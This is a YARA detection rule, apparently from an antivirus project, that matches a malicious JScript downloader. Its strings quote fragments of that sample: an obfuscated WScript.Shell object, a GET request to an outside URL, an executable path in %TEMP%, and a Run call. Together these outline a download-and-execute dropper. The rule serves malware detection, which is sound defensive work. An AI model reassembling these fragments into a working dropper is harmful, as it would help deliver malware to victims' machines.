rule sig_20160328_8a3de42f6899627cd3cff7352e30a19e {
  meta:
    description = "datamaliciousorder - file 20160328_8a3de42f6899627cd3cff7352e30a19e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7e6f59655c9fad0f0a496b8cbba5ac45df3eb74312faf491cb7c9e3b905f2a8a"

  strings:
    $s1  = "function Jrmrbsh() {return Kpzhcfd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"NVSSrg0S.exe\";};" fullword ascii
    $s2  = "do {WScript[Nerzdfefd](Dinvzwt() * 11)} while (Fxvpscpm[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Yyamtuzj(Hamqsoqn, Ywwjavtuv){return Hamqsoqn - Ywwjavtuv;};" fullword ascii
    $s4  = "Fxvpscpm[Tyeovdmagm](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s5  = "var Kpzhcfd = function Abrnne() {return WScript[Avyvmyruf](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Nmnpz() {return ((Dxjlfywmuf == true) && (Dxjlfywmuf == Rnkxsnja)) ? 1 : Ltycggzabg;};" fullword ascii
    $s7  = "function Tqprfyfkb(Lfjrl){Kpzhcfd[\"Run\"](Lfjrl, Ltycggzabg, Ltycggzabg);};" fullword ascii
    $s8  = "Dxjlfywmuf = true; " fullword ascii
    $s9  = "function Dinvzwt(){return 22;};" fullword ascii
    $s10 = "var Esuxboaqjv = new this[\"Date\"]();" fullword ascii
    $s11 = "var Pghlcthxh = false;" fullword ascii
    $s12 = "function Zfrcd()" fullword ascii
    $s13 = "return Yyamtuzj(Kyfujodv, Ntumsorh);" fullword ascii
    $s14 = "var Rnkxsnja = false;" fullword ascii
    $s15 = "function Bpdihibl(){return Avyvmyruf;};" fullword ascii
    $s16 = "function Twsuw(){return Fesficvqtg;};" fullword ascii
    $s17 = "function Cijietco(Rctvj) {var Frpwvqvgpz = (1, 2, 3, 4, 5, Rctvj); return Frpwvqvgpz;};" fullword ascii
    $s18 = "var Dxjlfywmuf = false;" fullword ascii
    $s19 = "Rnkxsnja = true; " fullword ascii
    $s20 = " while (Qifcwzdtd){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}